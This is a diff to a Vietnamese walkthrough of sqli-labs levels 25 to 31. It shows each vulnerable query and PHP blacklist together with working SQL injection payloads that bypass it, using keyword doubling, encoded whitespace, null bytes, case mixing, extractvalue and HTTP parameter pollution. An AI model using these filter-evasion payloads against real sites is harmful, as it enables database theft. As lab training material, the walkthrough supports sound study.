@@ -4,6 +4,16 @@ Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)
 
 - [Less-23](#Less-23)
 - [Less-24](#Less-24)
+- [Less-25](#Less-25)
+- [Less-25a](#Less-25a)
+- [Less-26](#Less-26)
+- [Less-26a](#Less-26a)
+- [Less-27](#Less-27)
+- [Less-27a](#Less-27a)
+- [Less-28](#Less-28)
+- [Less-28a](#Less-28a)
+- [Less-29](#Less-29)
+- [Less-30](#Less-30)
 
 ## Less-23
 
@@ -105,3 +115,287 @@ Boom
 
 ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-24_5.png?raw=true)
 
+## Less-25
+
+Câu query của bài này là:
+
+```mysql
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+```
+
+Nhưng `or`, `and` bị ban
+
+```php
+function blacklist($id)
+{
+	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
+
+	return $id;
+}
+```
+
+Tuy nhiên bypass cũng khá đơn giản và có nhiều cách.
+
+- Lợi dụng `replace` `OR` hoặc `AND` thành `""`
+  	Cụ thể là dùng `oorr` thay cho `or` và `aandnd` thay cho `and`
+  Payload: `?id=%27+UNION+(SELECT+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFOORRMATION_SCHEMA.SCHEMATA)--+`
+- Sử dụng `Logical Operators`
+  	Cụ thể là dùng `||` thay cho `OR` và `&&` thay cho `AND`
+  Payload: `?id=%27+||+extractvalue(0x0a,concat(0x0a,(select+@@datadir)))--+`
+
+## Less-25a
+
+```mysql
+SELECT * FROM users WHERE id=$id LIMIT 0,1
+```
+
+Câu này tương tự câu 25.
+
+Payload: `?id=0+union+select+1,2,GROUP_CONCAT(+SCHEMA_NAME+)+FROM+INFOORRMATION_SCHEMA.SCHEMATA--+`
+
+## Less-26
+
+```mysql
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+	$id= preg_replace('/[--]/',"", $id);		//Strip out --
+	$id= preg_replace('/[#]/',"", $id);			//Strip out #
+	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
+	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
+	return $id;
+}
+```
+
+Câu này danh sách ban khá nhiều: `OR`,`AND`,`/*`,`--`,`#`,` `,`\`.
+
+Nhưng mình vẫn có thể bypass bằng cách ở câu 25.
+
+Một số payload để bypass.
+
+- Sử dụng `%0b` hoặc `%0a` thay cho `space`
+
+  Payload: `?id=0%27%0bUNION%0bSELECT%0b1,2,(SELECT%0bGROUP_CONCAT(SCHEMA_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.SCHEMATA)%27`
+
+  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26_1.png?raw=true)
+
+- Sử dụng `||` để bypass
+  Payload: `?id=%27+||+extractvalue(0x0a,concat(0x0a,(database())))||%27`
+  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26_2.png?raw=true)
+  
+- Sử dụng `%0b` và `%00` để bypass
+  Payload: `?id=0%27%0bunion%0bselect%0b1,2,(SELECT%0bGROUP_CONCAT(SCHEMA_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.SCHEMATA);%00` 
+
+## Less-26a
+
+```mysql
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+	$id= preg_replace('/[--]/',"", $id);		//Strip out --
+	$id= preg_replace('/[#]/',"", $id);			//Strip out #
+	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
+	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
+	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
+	return $id;
+}
+```
+
+Vẫn như câu 26, mình vẫn sử dụng `%0b` để bypass `space` và sử dụng `%00` (null character).
+
+Payload: `?id=0%27)%0bunion%0bselect%0b1,2,(SELECT%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFOORRMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-26a.png?raw=true)
+
+## Less-27
+
+```mysql
+SELECT * FROM users WHERE id='$id' LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+$id= preg_replace('/[--]/',"", $id);		//Strip out --.
+$id= preg_replace('/[#]/',"", $id);			//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);	    //Strip out union
+$id= preg_replace('/select/s',"", $id);	    //Strip out select
+$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
+$id= preg_replace('/Select/s',"", $id);	    //Strip out select
+return $id;
+}
+```
+
+Câu này ban khá nhiều: `/*`,`--`,`#`,` `,`union`,`select`,`UNION`,`SELECT`,`Union`,`Select`.
+
+- Sử dụng `uNion` để bypass `UNION`, `sElect` để bypass `SELECT`.
+
+  Payload: `?id=0%27%0buNion%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00` 
+
+  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27_1.png?raw=true)
+
+- Sử dụng `extractvalue()`
+  Payload: `?id=0%27%0band%0bextractvalue(0x0a,concat(0x0a,((sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security"))));%00`
+  ![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27_2.png?raw=true)
+
+## Less-27a
+
+```mysql
+SELECT * FROM users WHERE id=$id LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+$id= preg_replace('/[--]/',"", $id);		//Strip out --.
+$id= preg_replace('/[#]/',"", $id);			//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);	    //Strip out union
+$id= preg_replace('/select/s',"", $id);	    //Strip out select
+$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
+$id= preg_replace('/Select/s',"", $id);	    //Strip out Select
+return $id;
+}
+```
+
+Tương tự câu 27, ngoài `%0b` bạn cũng có thể sử dụng `%a0` để bypass `space`. 
+
+Payload: `?id=?id=0"%0bunIon%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-27a.png?raw=true)
+
+## Less-28
+
+```mysql
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
+$id= preg_replace('/[--]/',"", $id);				//Strip out --.
+$id= preg_replace('/[#]/',"", $id);					//Strip out #.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
+return $id;
+}
+```
+
+Tương tự câu 27, ngoài `%0b` bạn cũng có thể sử dụng `%a0` để bypass `space`.
+
+`?id=%27)%0bunIon%0bsElect%0b1,2,(sElect%0bGROUP_CONCAT(TABLE_NAME)%0bFROM%0bINFORMATION_SCHEMA.TABLES%0bWHERE%0bTABLE_SCHEMA="security");%00`
+
+`?id=%27)%a0unIon%a0sElect%a01,2,(sElect%a0GROUP_CONCAT(TABLE_NAME)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA="security");%00`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-28.png?raw=true)
+
+## Less-28a
+
+```mysql
+SELECT * FROM users WHERE id=('$id') LIMIT 0,1
+```
+
+```php
+function blacklist($id)
+{
+//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
+//$id= preg_replace('/[--]/',"", $id);				//Strip out --.
+//$id= preg_replace('/[#]/',"", $id);					//Strip out #.
+//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.
+//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out spaces.
+return $id;
+}
+```
+
+Nhìn vào `blacklist` của câu này, thì `blacklist` của câu 28 bao hàm cả câu 28a này nên payload cũng sẽ tương tự.
+
+`?id=%27)%a0unIon%a0sElect%a01,2,(sElect%a0GROUP_CONCAT(TABLE_NAME)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=%22security%22);%00`
+
+## Less-29
+
+[Source](https://github.com/Audi-1/sqli-labs/blob/master/Less-29/login.php) của bài này.
+
+Đọc sơ qua code thì bạn phải vượt qua `WAF` để có thể exploit `SQL Injection`.
+
+Sau khi đọc [docs](https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf) của bài cung cấp thì mình tìm được một khái niệm khá thú vị, đó là `HTTP Parameter Pollution (HPP)`.
+
+`HPP` là một kỹ thuật tấn công mà attacker sẽ tạo ra các `parameter` trùng lặp trong HTTP request. Lợi dụng các impact khi xử lý các `parameter` ở các ngôn ngữ khác nhau để inject code độc hại. Bypass WAF là một trong những kĩ thuật mà attacker có thể lợi dụng. Để hiểu thêm về HPP, có thể tham khảo: [đây](https://whitehat.vn/threads/gioi-thieu-ve-http-parameter-pollution.4932/) và [đây](https://stackoverflow.com/questions/19809142/http-parameter-pollution).
+
+Trong `PHP`, khi bạn truyền 2 `param` trùng lặp thì nó sẽ nhận tham số cuối.
+
+Hình dưới là kết quả về user với `id=1`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_1.png?raw=true)
+
+Còn đây là khi truyền 2 param `id`, kết quả trả về user thứ 2.
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_2.png?raw=true)
+
+Đến đây thì chắc chắn để bypass WAF thì bạn phải inject code vào param thứ 2.
+
+Payload: `login.php?id=1&id=0%27%20union%20select%201,2,%27nguyendqn%27--+`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-29_3.png?raw=true)
+
+## Less-30
+
+Tương tự câu 29.
+
+```mysql
+SELECT * FROM users WHERE id=$id LIMIT 0,1
+```
+
+```php
+$id = '"' .$id. '"';
+```
+
+Và `$id` bị lồng vào `""` nên chỉ cần escape là có thể solve được.
+
+Payload: `login.php?id=1&id=0"%20union%20select%201,2,%27nguyendqn%27--+`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-30.png?raw=true)
+
+## Less-31
+
+Tương tự câu 29 và 30.
+
+```mysql
+SELECT * FROM users WHERE id=($id) LIMIT 0,1
+```
+
+```php
+$id = '"' .$id. '"';
+```
+
+Payload: `login.php?id=1&id=0")%20union%20select%201,2,%27This%20is%20level%2031%27--+`
+
+![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-31.png?raw=true)
